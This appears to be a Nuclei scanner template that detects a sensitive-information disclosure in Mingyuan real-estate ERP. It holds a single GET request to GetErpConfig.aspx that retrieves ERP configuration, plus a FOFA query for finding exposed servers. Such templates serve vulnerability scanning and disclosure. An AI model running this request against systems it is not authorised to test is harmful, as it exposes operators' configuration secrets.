id: mydc-erp-GetErpConfig-disclosure
info:
  name: 明源云 erp 报表 - 敏感信息泄露
  author: Thomas
  severity: high
  description:
  reference:
    - todo
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="明源地产ERP" && icon_hash="-1520670993"
  tags: mydc,disclosure

http:
  - raw:
      - |
        GET /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'ErpKey','erp60')
        condition: and